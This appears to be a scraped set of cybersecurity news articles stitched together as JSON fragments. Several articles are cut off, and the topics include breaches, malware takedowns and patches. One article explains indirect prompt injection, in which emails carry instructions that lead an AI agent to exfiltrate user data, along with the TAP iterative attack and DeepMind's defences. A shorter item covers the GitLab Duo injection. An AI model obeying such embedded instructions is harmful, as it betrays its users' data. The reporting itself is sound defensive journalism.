somewhat of a buzzword these days like ‘cognitive computing’ where anything could be claimed as ‘neuromorphic’ to the extent it mimics the distributed processing nature of the brain.”\n\nHis concern is that the buzz of the technology will make us overly trust one of the side-effects of neuromorphic computing – increased privacy. By being close to the source, by working from electrical signals rather than identifiable names and information, by processing that data internally and not requiring external storage, neuromorphic systems promise greater privacy.\n\n“I find the claim that it provides better control over privacy just because it mimics the brain to be dubious,” continues Shashanka. “A different computing architecture will come with different levels of privacy tradeoffs but there is no magic bullet – one has to build data privacy and security into the architecture design from the start at the system level.”\n\nOthers worry about the potentiality for dual use. Whenever a new technology is introduced for defenders, it is rapidly subverted for use by attackers – usually they use it both as a new attack vector and an attack tool. Just consider AI.\n\n“Think smarter drones, real-time threat detection, human-machine symbiosis and much more, like a good sci-fi movie,” comments Boaz Barzel, field CTO at OX Security. “But here’s the twist: Just like any dual-use tech, it won’t stay on the ‘good side’ for long. The same capabilities that make it ideal for adaptive robotics or autonomous vehicles also make it perfect for autonomous attack systems, undetectable surveillance, and decision-making malware that evolves on the fly. We’re building digital brains, but we haven’t figured out how to keep them ethical.”\n\nBenas adds, “My prediction is, when things like SNNs become more mainstream, we’ll see the typical spike in security problems for the first few years, followed by a cooling off period when the technology is better understood. And the cycle continues with each new breakthrough, technology, paradigm, platform, and so on. The optimist inside me thinks that, by and large, we’ll all get better at securing everything because of it.”\n\nWhile most discussions on neuromorphic computing talk about potential, there is at least one device already in production: the T1 Spiking Neural Processor, a microcontroller produced by Innatera, that makes full use of the advantages offered by neuromorphic devices.\n\nInnatera is a Dutch spinoff from the Delft University of Technology, founded in 2018. From the beginning, its purpose was to bring ‘brain-like intelligence to sensors’. “Sensors are everywhere,” says co-founder and CEO Sumeet Kumar. “Last year alone, about 4 billion new devices packed with sensors came online, including phones, watches and other wearables, cars and robotics. These sensors are used to gather information to direct the devices’ applications.\n\nBut they suffer from two fundamental problems. Firstly, the devices tend to be battery powered, but processing the sensor data is power hungry. These batteries require frequent changing or charging, potentially interrupting the always-on requirement of the sensors.\n\nSecondly, the sensors gather huge amounts of data that currently needs to be sent to the cloud for processing. This can introduce latency and creates the potential for sensitive and sometimes intimate personal data to be leaked or stolen. “You’re sending private data to a place where you no longer have control over that data,” Kumar points out.\n\nHis solution is to use the parallel processing and the local memory of neuromorphic computing to keep data with its source. Sensor data is received, processed and fed directly into the application with no chance of leakage. At the same time, the low power consumption of SNNs extends the battery life enormously.\n\nThe Innatera microcontroller brings intelligence close to the sensor with a spiking neural network engine and a RISC-V processor core. “Our chips allow you to analyze sensor data in real time to detect and identify patterns of interest. What makes these processors so special is that they mimic how your brain works. So, every time you see something, hear something, or smell something with your personal human sensors, there are certain processes that occur in your brain that allow it to identify what’s happening in the world around you,” he continues.\n\nSo, just as the human brain interprets vision by receiving and analyzing light waves, and audio by receiving and analyzing sound waves, so this chip receives and analyzes sensor data. “It works by encoding the critical information that is present inside a sensor data stream into individual voltage spikes. This data is encoded into precisely when these spikes occur in time – if a feature is very important, the spike occurs early. If a feature is less important, the spike occurs late. The SNN manipulates the timing relationships between all these spikes to discover what patterns are hidden inside the sensor data.”\n\nThose patterns can be converted into instructions for the application using the sensor, but all done locally. For example, a wearable health monitor can measure and respond to its sensor data without any personal information leaving the device. “That raw data never has to be sent out of the device. It can be processed with a very high accuracy in real time directly inside of the device, preserving the privacy of the user.”\n\nHow the microcontroller interprets the spike patterns from different types of sensors driving different applications will vary and will need to be encoded into each microcontroller installation. To facilitate this, Innatera has developed and provides a special SDK named Talamo. It allows engineers to build SNN models directly in PyTorch using libraries provided by the firm.\n\n“Engineers can build neural networks very quickly using a well understood workflow without having to understand too much about what’s inside the chip. Talamo includes an architecture simulator so that simulations and design iterations can be run without touching the hardware. When satisfied with an optimized model, a compiler allows the model to be mapped onto the chip without any need to understand what’s going on inside the chip. The SDK ensures a simple development process without the need to retain existing engineers.”\n\nInnatera’s SNN T1 chip has been with sampling customers since early last year, and the spiking neural processor entered volume production in December. Some of the sampling customers are already building applications.\n\nSNNs for sensors is a new but promising area. The first applications are, unsurprisingly, relatively simple. “They include presence sensing for smart lighting, and security cameras, similar solutions for doorbells, audio recognition, and activity monitoring and cardiovascular monitoring in leisure and health wearables,” says Kumar.\n\nBut what Innatera’s SNN microcontroller demonstrates is that neuromorphic computing has moved from theory to practice. Its future, and the speed of evolution will depend only on the demands of the market: navigation built into free moving robots, and complex instructions to shop floor robotics will come in the future.\n\nWe asked Kumar if his system would be able to hear, transcribe and print a copy from a sensitive conversation on a single device without any audio having to leave that device. He noted that the current crop of chips isn’t yet sufficiently complex to achieve that particular composite task, but added, “Absolutely. That is the very intent of these chips, to be able to take all that data, convert it into actionable patterns, actionable insights, and act on the result without the data having to be sent anywhere else. So essentially, that sort of audio recording and transcribing would happen right on the device.”\n\nRelated: Amazon Ends Privacy Feature That Let Echo Users Opt Out of Sending Recordings to Company\n\nRelated: ‘JekyllBot:5’ Vulnerabilities Allow Remote Hacking of Hospital Robots\n\nRelated: Brain-Inspired System Aims to Improve Threat Detection",

        "title": "Google DeepMind Unveils Defense Against Indirect Prompt Injection Attacks",
        "content": "날짜: 2025-05-21\n\n요약: Google DeepMind has developed an ongoing process to counter the continuously evolving threatIndirect prompt injection (IPI) attacks.\n\n본문:\nGoogle DeepMind has developed an ongoing process to counter the continuously evolving threat from Agentic AI’s bete noir: adaptive indirect prompt injection attacks.\n\nIndirect prompt injection (IPI) attacks are a serious threat to agentic AI. They interfere with the inference stage of AI operation – that is, IPI attacks influence the response from the model to the benefit of the attacker. The attacker requires no direct access to the models’ learning data – indeed, the attacker neither has nor needs any knowledge of the internal workings, probabilities, or gradients of the model – but instead relies on agentic AI’s intrinsic ability to autonomously learn from other tools.\n\nConsider an agentic AI system designed to improve the user’s email operations. Of necessity, the model must have access to and be able to learn from the user’s emails. Here, an IPI attacker can simply embed new instructions in an email sent to the user. Those instructions are learned by the model and can adversely affect the model’s future responses to user requests.\n\nThey could, for example, instruct the model to exfiltrate sensitive user data to the attacker, outline the user’s calendar details, or respond with details when an email includes trigger words like ‘important update’.\n\nGoogle DeepMind (GDM) has developed a process for the continuous recognition of IPI attacks, and subsequent training (fine tuning) the model not to respond. As a result, the latest version of Gemini (2.5.) is now more resilient to IPI attacks. This process is explained in a new white paper, Lessons from Defending Gemini Against Indirect Prompt Injections (PDF).\n\nLearn More at the AI Risk Summit | August 19-20, Ritz-Carlton, Half Moon Bay\n\nThere is no simple solution. Building specific defenses within the model is only a partial and probably transitory answer. Advanced attackers use adaptive attacks. If the model has been trained to recognize and counter a specific IPI attack, the attack will fail – but the attacker learns that it fails and begins to understand the defense mechanisms at work. The attack becomes an iterative process with the attacker continuously learning about the defenses until able to bypass them.\n\nIn Gemini 2.0, adaptive attacks increased the attack success rate (ASR) against Gemini 2.0 defenses in 16 out of 24 cases.\n\nThe defense must match this process. GDM’s new IPI defense for Gemini 2.5 is also iterative with continuous and automated red teaming (ART), and continuous fine tuning. “We fine-tuned Gemini on a large dataset of realistic scenarios, where ART generates effective indirect prompt injections targeting sensitive information. This taught Gemini to ignore the malicious embedded instruction and follow the original user request, thereby only providing the correct, safe response it should give,” explains the GDM security and privacy research team in an associated blog.\n\nThe ART uses its own suite of adaptive attack techniques to test the model’s resilience. If a red team attack succeeds, the model is fine tuned to ignore similar or subsequent IPI attacks. The research found, however, that GDM’s new adversarial approach to hardening agentic AI against adaptive IPI attacks is best viewed as an addition to, rather than replacement for, existing IPI defense techniques. As an example, the research showed one of the most effective prior external defenses used in Gemini 2.0 was the ‘Warning’ defense. Here, the model is simply instructed not to expose private user information in a response following untrusted data in the prompt.\n\nGDM found that combining the Warning defense and its new adversarially trained approach had a defensive success rate superior to either approach in isolation. “We believe that combining adversarial training and external or system-level defenses will substantially increase the complexity, cost, and sophistication required for an attacker to succeed, thereby reducing the risk across a range of threats and forcing adversaries toward potentially more detectable or resource-intensive methods; all of which contribute to a more robust overall security posture for agentic AI systems,” notes the white paper.\n\nSecuring an AI asset is like securing any other corporate asset – you cannot guarantee success. GDM does not claim the addition of its adversarial approach will prevent all adaptive indirect prompt injection attacks, but the research shows that it is a major new addition to the defense armory.\n\nThe precise success rates vary in different attack scenarios and targets but can be seen in an adaptive attack type called TAP (Tree of Attacks with Pruning). This attack requires no knowledge of the model’s working. The attacker generates triggers. These are tested against the target model. Ineffective triggers are discarded; promising are ones retained. This continues iteratively until a successful prompt injection is found.\n\nGDM’s research found that in an email scenario, the TAP attack success rate fell from 99.8% in Gemini 2.0 to 53.6% in Gemini 2.5. This is the realistic purpose of cybersecurity: to make life harder and more costly for the attacker – and it allows GDM to claim Gemini 2.5 as the most secure version it has produced.\n\nRelated: NIST: No Silver Bullet Against Adversarial Machine Learning Attacks\n\nRelated: All Major Gen-AI Models Vulnerable to ‘Policy Puppetry’ Prompt Injection Attack\n\nRelated: How Hackers Manipulate Agentic AI With Prompt Engineering\n\nRelated: Microsoft Details ‘Skeleton Key’ AI Jailbreak Technique",

        "title": "Up to 25% of Internet-Exposed ICS Are Honeypots: Researchers",
        "content": "날짜: 2025-05-21\n\n요약: Many of the industrial control system (ICS) instances seen in internet scanning are likely or possibly honeypots, not real devices.\n\n본문:\nAn analysis conducted by researchers at the Norwegian University of Science and Technology Gjøvik and the Delft University of Technology in the Netherlands showed that a significant percentage of the industrial control system (ICS) instances detected by  internet scans are actually honeypots.\n\nThe researchers used the Censys search engine to identify internet-exposed ICS. They targeted 17 widely used industrial control protocols and discovered roughly 150,000 devices across 175 countries.\n\nThe researchers then applied various criteria to determine how many of those ICS instances were real and how many were likely or possibly honeypots, decoy systems designed to attract threat actors in an effort to obtain valuable information on attacker tactics, techniques, and procedures (TTPs).\n\nWhile Censys was used to collect the data on internet-exposed systems, the researchers noted that their methods can be applied to any source data, including Shodan and independent scanning.\n\nTheir analysis was conducted over a period of one year, between January 2024 and January 2025. In April 2024, they determined that roughly 15% of the ICS devices they were seeing online appeared to be honeypots, and the percentage increased to 25% in January 2025.\n\nThe researchers attempted to detect honeypots based on various types of information, each enabling them to assess that a system is a honeypot with low, medium or high confidence.\n\nFor instance, honeypot software often has a specific signature, which enabled the researchers to classify the systems running this software as honeypots with high confidence.\n\nAnother clue that can reveal a honeypot is network type — real ICS should be on an industrial network and it should not have IPs associated with a hosting provider. This can be used to identify a honeypot with medium confidence.\n\nOpen ports can also provide valuable clues, as a large number of open ports on a system is unusual. The more open ports, the higher the chances of a system being an ICS honeypot rather than a real industrial device.\n\n“Our methodology and findings challenge previous ICS studies which either partially considered or completely overlooked honeypots, leading to an inflated number of detected exposed ICS devices,” the researchers said. “It improves the detection accuracy of vulnerable ICS devices and makes researchers aware of current pitfalls in detection methods.”\n\nContacted by SecurityWeek, Censys Principal Security Researcher Emily Austin noted, “It can be challenging to determine the exact percentage of ICS honeypots online at a given time. These researchers used methods similar to those we use at Censys to identify deceptive services.”\n\n“However, there are some differences in methodology–including using network classification as an indicator–that may explain why their reported ICS honeypot numbers are higher than what we typically observe. But overall, the approach to honeypot detection outlined in this paper seems very reasonable and defensible,” Austin said.\n\n“Their observations around differences in honeypot prevalence by protocol are also similar to patterns we’ve observed in the past. Some ICS-related services are simpler to run than others or have open source honeypots available (e.g., ATG), which likely contributes to these differences,” she added.\n\nThe paper also mentions Shodan Honeyscore, a service designed for detecting honeypots. The researchers decided against using it due to errors and seemingly inaccurate results. However, Shodan’s John Matherly told SecurityWeek that Honeyscore hasn’t been an active service for years — it has been expanded and rolled into the crawlers themselves.\n\nMatherly noted that Shodan now automatically filters out ICS honeypots so that they don’t show up in searches. “In general, honeypots have seen increased deployment over the years which I would expect to also apply to ICS,” Matherly noted.\n\nShodan currently shows just over 100,000 internet-exposed ICS instances, with a slight downward trend recorded over the past few years.\n\nRelated: PLCHound Aims to Improve Detection of Internet-Exposed ICS\n\nRelated: Iranian Hackers Use IOCONTROL Malware to Target OT, IoT Devices in US, Israel\n\nRelated: US Warns of Hackers Targeting ICS/SCADA at Oil and Gas Organizations",

A mandatory filing to the Maine Attorney General now pins the number at 69,461 customers nationwide and dates the breach back to last December.\n\nAccording to the new disclosure form, a group of unidentified overseas customer-support contractors began siphoning data on December 26, 2024, but the breach didn’t come to light until Coinbase’s security team spotted suspicious activity on May 11 this year, the same day Coinbase received the extortion demand.\n\nIn the filing, Coinbase described the incident simply as “insider wrongdoing.”\n\nThe company said rogue contractors were bribed to supply names, postal and email addresses, phone numbers and the last four digits of Social Security numbers. Some records also included masked bank details plus images of driver’s licenses or passports, more than enough to mount convincing phishing scams.\n\nCoinbase maintains that no funds were touched and that its Prime, hot-wallet and cold-storage systems were never at risk.\n\nCoinbase began mailing notification letters on May 30 and is offering affected users a year of IDX credit-monitoring and $1 million in identity-theft insurance.\n\nThe US cryptocurrency exchange said it will voluntarily reimburse retail customers who were duped into sending cryptocurrency to the scammers, once investigators verify each claim.\n\nIt is also opening a new U.S. support hub, adding stronger insider-threat monitoring, and placing additional identity checks and scam-awareness prompts on high-risk withdrawals.\n\nIn an SEC filing last week, the company pegged the preliminary cost of remediation and reimbursements at between $180 million and $400 million.\n\nRelated: Coinbase Rejects $20M Extortion Demand After Insider Breach\n\nRelated: Cryptocurrency Stolen From Thousands of Coinbase Accounts\n\nRelated: Coinbase Hack Linked to Group Behind Twilio, Cloudflare Attacks\n\nRelated: Coinbase Pays $250K for ‘Market-Nuking’ Security Flaw\n\nRelated: Coinbase Users Face Ongoing Phishing Attacks",

One of the organizations appears to be PowerSchool.\n\nThe student, Matthew D. Lane, 19, was charged with extorting a $200,000 ransom from a telecommunications company in exchange for not publicly sharing data previously stolen from it.\n\nAccording to the indictment (PDF), the telecoms provider was hacked in October 2022, and confidential customer information was stolen from its systems.\n\nLast year, Lane and others conspired to extort the carrier, threatening to leak the stolen information unless the ransom was paid and telling it that they had the only copy of the data.\n\nThe indictment also alleges that, in September 2024, Lane used an employee’s stolen credentials to hack into the network of a company that serves school districts in the US and Canada, stealing the personal information of both students and teachers.\n\nIn December, Lane allegedly transferred the information, including names, addresses, Social Security numbers, medical information, and other data, to a server he had leased in Ukraine.\n\nAccording to the indictment, on December 28, the company received a ransom demand alleging that the personally identifiable information (PII) of over 60 million students and more than 10 million teachers would be leaked online unless a ransom of roughly $2.85 million would be paid, in Bitcoin.\n\nWhile the hacked company has not been named, the description of the intrusion and the number of potentially impacted individuals matches those associated with the massive PowerSchool hack that came to light in January 2025.\n\nThe California-based education tech giant, which provides K-12 software and cloud-based solutions for school operations globally, said in January that PII was stolen from its Student Information System (SIS) environments.\n\nIn March, CrowdStrike shared the findings of its investigation into the attack, revealing that compromised credentials for a maintenance account were used to access PowerSchool’s SIS service through the company’s PowerSource portal. The portal was initially accessed in August and September 2024.\n\nStudent and teacher data was exfiltrated from PowerSchool’s environment between December 19 and December 28, Crowdstrike said, adding that it found no evidence of malware deployment or unauthorized activity after December 28.\n\nPowerSchool reportedly paid a ransom to ensure that the stolen information was not shared publicly, but the company has not confirmed it.\n\nIn early May, the Toronto District School Board (TDSB) revealed that a threat actor had started contacting school districts in the US and Canada, claiming it was in the possession of the stolen data and demanding new ransom payments.\n\n“Members of the public who have questions or concerns as to whether a particular student and/or teacher’s information was compromised should contact their local school district,” the Department of Justice said on Tuesday.\n\nLane agreed (PDF) to plead guilty to hacking the two companies, but a plea hearing has not yet been scheduled.

According to its developers, “The idea is to implement all the needed OpenPGP functionality in a JavaScript library that can be reused in other projects that provide browser extensions or server applications.”\n\nIts website shows that OpenPGP.js is used by projects such as FlowCrypt, Mymail-Crypt, UDC, Encrypt.to, PGP Anywhere, and Passbolt.\n\nResearchers Edoardo Geraci and Thomas Rinsma of Codean Labs discovered recently that OpenPGP.js is affected by a critical vulnerability.\n\nThe flaw enables an attacker to spoof signature verification using a specially crafted message passed to the ‘openpgp.verify’ or ‘openpgp.decrypt’ functions, causing them to “return a valid signature verification result while returning data that was not actually signed”.\n\n“In order to spoof a message, the attacker needs a single valid message signature (inline or detached) as well as the plaintext data that was legitimately signed, and can then construct an inline-signed message or signed-and-encrypted message with any data of the attacker’s choice, which will appear as legitimately signed by affected versions of OpenPGP.js,” the researchers explained.\n\n“In other words, any inline-signed message can be modified to return any other data (while still indicating that the signature was valid), and the same is true for signed+encrypted messages if the attacker can obtain a valid signature and encrypt a new message (of the attacker’s choice) together with that signature,” they added.\n\nTracked as CVE-2025-47934, the issue impacts OpenPGP.js versions 5 and 6, and it has been patched with the release of versions 5.11.3 and 6.1.1.

        "content": "날짜: 2025-05-23\n\n요약: Signal said the privacy feature is on by default for every Windows 11 user to block Microsoft from taking screenshots for Windows Recall.\n\n본문:\nSignal on Friday shipped a new feature that automatically blocks all screenshots of its chat window, positioning it as a privacy shield aimed at Microsoft’s controversial Windows Recall technology that logs on-screen activity every few seconds for AI search.\n\nThe new Signal feature sets a “screen security” flag that blocks the Windows OS from capturing screenshots of Signal chats. If a user or the Recall utility tries, the result is a blank frame. Signal said the screenshot-blocker is on by default for every Windows 11 user; toggling it off requires digging into preferences and dismissing a bright warning.\n\n“Although Microsoft made several adjustments over the past twelve months in response to critical feedback, the revamped version of Recall still places any content that’s displayed within privacy-preserving apps like Signal at risk,” according to a note from the makers of the encrypted messaging app.\n\n“As a result, we are enabling an extra layer of protection by default on Windows 11 in order to help maintain the security of Signal Desktop on that platform even though it introduces some usability trade-offs. Microsoft has simply given us no other option,” Signal developer Joshua Lund said.\n\nThe controversial Windows Recall has had a topsy-turvy existence since it was heavily promoted by Microsoft CEO Satya Nadella as the hero-feature in the company’s fleet of AI-powered computers.\n\nThe company delayed the release of the technology to quell concerns and address security and privacy risks, eventually overhauling the security architecture with proof-of-presence encryption, anti-tampering and DLP checks, and screenshot data managed in secure enclaves outside the main operating system.\n\nNow, as Microsoft readies for another rollout attempt, Signal warns that the software maker has not included granular settings for app developers, describing that as “a glaring omission that limits our choices.”\n\n“We hope that the AI teams building systems like Recall will think through these implications more carefully in the future. Apps like Signal shouldn’t have to implement “one weird trick” in order to maintain the privacy and integrity of their services without proper developer tools,” Lund argued.\n\nSignal cautions that integration of AI agents with “pervasive permissions, questionable security hygiene, and an insatiable hunger for data” has the potential to “break the blood-brain barrier between applications and operating systems.”\n\n“This poses a significant threat to Signal, and to every privacy-preserving application in general,” Signal’s Lund declared.\n\n“Private messaging apps like Signal deserve to be treated with at least the same level of caution that’s afforded to a web browser’s private or incognito browsing window — which Microsoft has already excluded from Recall by default,” Lund noted.\n\nRelated: Controversial Windows Recall Gets Proof-of-Presence Encryption, Data Isolation\n\nRelated: Microsoft’s Windows Recall: Cutting-Edge Search Tech or Creepy Overreach?\n\nRelated: Researchers Show How Malware Could Steal Windows Recall Data\n\nRelated: Microsoft Bows to Pressure, Disables Controversial Windows Recall by Default\n\nRelated: Microsoft’s Security Chickens Have Come Home to Roost",

        "content": "날짜: 2025-05-23\n\n요약: The DanaBot botnet ensnared over 300,000 devices and caused more than $50 million in damages before being disrupted.\n\n본문:\nThe notorious DanaBot botnet has been severely disrupted as part of an international law enforcement operation, which also involved charges and arrest warrants targeting over a dozen individuals.\n\nThe takedown effort is part of Operation Endgame, which in the past also targeted malware families such as Lumma Stealer, Smokeloader, TrickBot, and Bumblebee.\n\nEuropol announced that in the latest phase of Operation Endgame, which targeted DanaBot and other malware families that reemerged after previous takedown efforts, authorities and private sector partners aimed to break the ransomware killchain at the source, taking down roughly 300 servers and 650 domains, with international arrest warrants being issued for 20 individuals.\n\nAs part of Operation Endgame, law enforcement seized a total of $24 million worth of cryptocurrency, including $4 million in the latest action.\n\nThe US Justice Department said on Thursday that the DanaBot botnet was disrupted after it ensnared more than 300,000 computers worldwide, facilitating fraud and ransomware attacks that caused losses of at least $50 million.\n\nThe DoJ has unsealed charges against 16 individuals accused of being involved in the development and deployment of DanaBot. The list includes key players Aleksandr Stepanov, 39, aka JimmBee, and Artem Aleksandrovich Kalinkin, 34, aka Onix, both of Novosibirsk, Russia.\n\nThey both remain at large, but if ever prosecuted in the United States, Kalinkin faces up to 72 years in prison for the charges brought against him, while Stepanov faces up to five years in prison.\n\nCybersecurity blogger Brian Krebs pointed out that Kalinkin is an IT engineer at the Russian state-owned energy giant Gazprom.\n\nCourt documents revealed that many of the cybercriminals were identified after they accidentally infected their own computers with the DanaBot malware.\n\nDanaBot has been around since 2018. It initially targeted countries such as Ukraine, Poland, Austria, Italy, Germany and Australia, and quickly expanded to North America.\n\nDanaBot, offered under a malware-as-a-service model, was initially a banking trojan, enabling users to steal sensitive data from infected systems. It later developed into a distribution platform and loader for other malware families, including ransomware.\n\nSeveral cybersecurity firms assisted the law enforcement action. According to Proofpoint, the malware was used by several major cybercrime groups between 2018 and 2020, being mainly delivered through malicious emails. In mid-2020, it disappeared from the email threat landscape, but a resurgence was seen in mid-2024.\n\nEven while it was no longer being distributed via email campaigns, the malware was still used by cybercriminals, who leveraged malvertising and SEO poisoning for distribution.\n\nCrowdStrike, which tracks the threat actor as Scully Spider, noted that the group’s activities have been tolerated by the Russian government.\n\nThat is likely because, in addition to profit-driven cybercrime activities, some DanaBot sub-botnets have been used to support Russia’s military operations, particularly against Ukraine, while other sub-botnets have been used for espionage on behalf of the Russian government.\n\nThe Justice Department noted that the botnet version focusing on espionage targeted diplomats, law enforcement personnel, and members of the military in North America and Europe.\n\nLumen Technologies, whose Black Lotus Labs assisted law enforcement, said DanaBot had, on average, 150 active command and control (C&C) servers per day, which makes it one of the largest malware-as-a-service platforms in terms of C&C count. Black Lotus and Team Cymru have conducted research into the botnet’s infrastructure.\n\n“It remains to be seen whether Danabot can recover from the takedown,” said ESET researcher Tomáš Procházka. “The blow will, however, surely be felt, since law enforcement managed to unmask several individuals involved in the malware’s operations.”\n\nRelated: US Student to Plead Guilty Over PowerSchool Hack\n\nRelated: Prison Sentence for Man Involved in SEC X Account Hack",

The new microcontroller delivers 100X lower latency and 500X lower energy consumption than conventional processors, increasing battery life and providing local processing for the sensor devices used everywhere from wearables, healthcare and smart homes / offices to cars and industrial systems.\n\nAustralian hacker DR32 sentenced in US to time served\n\nDavid Kee Crees, a 26 year-old Australian national, was sentenced in the US to time served after being held in custody for at least three years. Known online as DR32, Abdilo, Notavirus, Surivaton, and Grey Hat Mafia’s Bitch, he allegedly hacked organizations in the US, sold source code and data, sold access to hacked resources, and even offered stolen credit card information for sale. He was charged in the US in 2021 on 22 counts and pleaded guilty in January 2025 to 14 of them, DataBreaches.net reports.\n\nEU sanctions more Russian entities over malicious cyber activities\n\nThe EU has announced more sanctions against Russia over its “destabilising actions”. One of the sanctioned entities is Stark Industries, a web hosting provider whose owners are accused of acting as “enablers of various Russian state-sponsored and affiliated actors to conduct destabilising activities including, information manipulation interference and cyber-attacks against the Union and third countries”.\n\nVolkswagen app hacked\n\nGerman carmaker Volkswagen recently patched vulnerabilities in its My Volkswagen application. The flaws could have allowed an attacker to obtain other users’ information, including vehicle location, engine health, fuel stats, tyre pressure, and geofencing controls, as well as personal information such as home address, phone number, email address, driving license, and service history. The researcher who found the security holes has published a blog post detailing his findings. Contacted by SecurityWeek, Volkswagen said the issues only impacted the app used in India and pointed out that there was no evidence of exploitation in the wild.\n\nImmersive launches OT security training solution\n\nCybersecurity training firm Immersive has launched a new OT security solution that enables hands-on training to help cybersecurity teams improve their skills for detecting and responding to cyber threats targeting operational environments. The company’s OT security training suite provides OT/ICS skill assessment capabilities, realistic scenario-based team exercises, and hands-on labs focusing on threat actors, malware, and threat intelligence.\n\nUS government data stolen in TeleMessage hack\n\nMessages exchanged by numerous American officials were intercepted by the hacker who breached the TeleMessage platform used by former Trump national security adviser Mike Waltz and more than 60 other unique government users, Reuters says. The data pertained to Secret Service members, customs officials, disaster responders, US diplomatic staffers, and at least one White House staffer.\n\nTrojanized RVTools installer delivers Bumblebee malware\n\nA trojanized version of the RVTools installer, distributed via a typosquatted domain, was caught delivering Bumblebee malware to users, Arctic Wolf reports. The domain, mimicking the legitimate tool’s site, uses the .org TLD instead of .com. Reports of the malicious installer first appeared in mid-May, and Robware has taken the tool’s official websites, namely Robware.net and RVTools.com, temporarily offline, warning users not to download RVTools from any other website.\n\nNew guidance on securing data used in AI systems\n\nCISA, the NSA, and the FBI have released new guidance on securing the data used to train and operate AI systems. The document (PDF) examines data security risks in AI systems, contains recommendations on protecting sensitive, proprietary, or mission critical data, and highlights how data security impacts the accuracy and integrity of AI outcomes.\n\nGitLab Duo remote prompt injection vulnerability\n\nA remote prompt injection vulnerability in AI-native GitLab assistant GitLab Duo could have allowed attackers to manipulate the code suggestions displayed to other users to inject untrusted HTML into repositories, exfiltrate source code from private projects, and steal undisclosed zero-day vulnerabilities, through the bot’s chat, Legit Security says. GitLab has already fixed the security defect.\n\nRelated: In Other News: Hackers Not Behind Blackout, CISO Docuseries, Dior Data Breach\n\nRelated: In Other News: India-Pakistan Cyberattacks, Radware Vulnerabilities, xAI Leak",

Defendant Gallyamov and his coconspirators received a portion of any ransom paid,” the indictment reads.\n\nIn August 2023, law enforcement agencies in multiple countries took down Qakbot’s infrastructure, disrupting the botnet and seizing millions of dollars in cryptocurrency. Soon after, however, the Qakbot gang was seen continuing the deployment of ransomware and malware.\n\nAccording to the indictment, as of May 2025, Gallyamov continues to engage in activities involving computer hacking, malware deployment, data theft, and extortion. Instead of using a botnet, the cybercriminal has relied on ‘spam bombing’ to target victim organizations.\n\nA civil forfeiture complaint (PDF) filed by the Department of Justice on Thursday reveals that, on April 25, 2025, pursuant to a seizure warrant, authorities seized an additional $4 million in cryptocurrency from Gallyamov. The US estimates that the illicit proceeds seized from Gallyamov are worth over $24 million.\n\nThe actions against Gallyamov were taken in conjunction with Operation Endgame, an ongoing international law enforcement effort to disrupt cybercrime operations worldwide. This week, authorities announced the takedown of DanaBot and Lumma Stealer as part of Operation Endgame.\n\nRelated: US Announces Botnet Takedown, Charges Against Russian Administrators\n\nRelated: US Indicts China’s iSoon ‘Hackers-for-Hire’ Operatives\n\nRelated: US Charges Genesis Market User\n\nRelated: US Charges Five People Over North Korean IT Worker Scheme",

In late April, CISA added the vulnerability to the KEV catalog.\n\nIn early May, the company updated its security advisory to warn that threat actors “may have accessed a subset of app credentials that certain Commvault customers use to authenticate their M365 environments.”\n\nTo help customers hunt for potential compromise, Commvault has provided indicators of compromise (IoCs) associated with the observed activity. It also rotated credentials and strengthened monitoring rules as a remediation action.\n\nThe malicious activity, the company has revealed, only impacted a small number of customers it has in common with Microsoft, but did not involve unauthorized access to customer backups stored by Commvault.\n\nAccording to CISA, the attackers might have exploited CVE-2025-3928 to access client secrets for Commvault’s M365 backup SaaS solution hosted in Azure, resulting in unauthorized access to “Commvault’s customers’ M365 environments that have application secrets stored by Commvault.”\n\n“CISA believes the threat activity may be part of a larger campaign targeting various SaaS companies’ cloud applications with default configurations and elevated permissions,” the agency notes.\n\nOrganizations are advised to monitor Entra audit logs, consider irregular logins as suspicious, conduct internal threat hunting, implement conditional access policies, rotate Commvault Metallic application secrets, rotate application credentials, review administrative privileges, and implement strong M365 security.\n\nFor on-premises deployments, organizations should restrict access to Commvault management interfaces, detect and block path-traversal attempts, block suspicious file uploads, apply the necessary patches, and monitor activity from unexpected directories.\n\nRelated: Critical Commvault Vulnerability in Attacker Crosshairs\n\nRelated: Stolen Credentials Have Turned SaaS Apps Into Attackers’ Playgrounds\n\nRelated: Microsoft Purges Dormant Azure Tenants, Rotates Keys to Prevent Repeat Nation-State Hack\n\nRelated: Chinese Spies Exploit Ivanti Vulnerabilities Against Critical Sectors",

An investigation revealed that the hackers had stolen some files.\n\nThe compromised data includes personal information such as name, address, date of birth, medical treatment information, and health insurance information. The stolen information varies by individual.\n\nMCP informed the US Department of Health and Human Services (HHS) this week that the incident impacted 235,911 individuals.\n\nA ransomware group named SafePay, which recently also targeted business services provider Conduent, took credit for the attack on MCP in late January.\n\nHowever, at the time of writing, MCP no longer appears to be listed on SafePay’s leak website, which could indicate that a ransom has been paid.\n\nSecurityWeek has reached out to the company for clarifications and will update this article if it responds.\n\nIt’s not uncommon for healthcare data breaches to impact hundreds of thousands of individuals, and some incidents affect millions and even tens of millions.\n\nRelated: Ransomware Attack Forces Kettering Health to Cancel Procedures\n\nRelated: 480,000 Catholic Health Patients Impacted by Serviceaide Data Leak\n\nRelated: 200,000 Harbin Clinic Patients Impacted by NRS Data Breach",

An attacker could exploit this vulnerability by sending a specific authentication request to a network access device (NAD) that uses Cisco ISE for authentication, authorization, and accounting (AAA),” Cisco notes in its advisory.\n\nThe networking giant also resolved a high-severity issue in Unified Intelligence Center, tracked as CVE-2025-20113, that could allow an authenticated attacker to elevate their privileges to those of an administrator, for a limited set of functions on a vulnerable system.\n\n“This vulnerability is due to insufficient server-side validation of user-supplied parameters in API or HTTP requests. An attacker could exploit this vulnerability by submitting a crafted API or HTTP request to an affected system,” Cisco explains.\n\nThe security defect was resolved alongside CVE-2025-20114, a medium-severity vulnerability that can be exploited for horizontal privilege escalation.\n\n“This vulnerability is due to insufficient validation of user-supplied parameters in API requests. An attacker could exploit this vulnerability by submitting crafted API requests to an affected system to execute an insecure direct object reference attack,” the advisory notes.\n\nMedium-severity bugs were also resolved in Webex, Webex Meetings, Secure Network Analytics Manager, Secure Network Analytics Virtual Manager, ISE, Duo, Unified Communications and Contact Center Solutions, and Unified Contact Center Enterprise (CCE).\n\nSuccessful exploitation of the security flaws could lead to XSS attacks, manipulated cached HTTP responses, arbitrary command execution, fraudulent findings in analytics reports, arbitrary command injection, privilege escalation, and data tampering.\n\nCisco says it is not aware of any of these vulnerabilities being exploited in the wild.

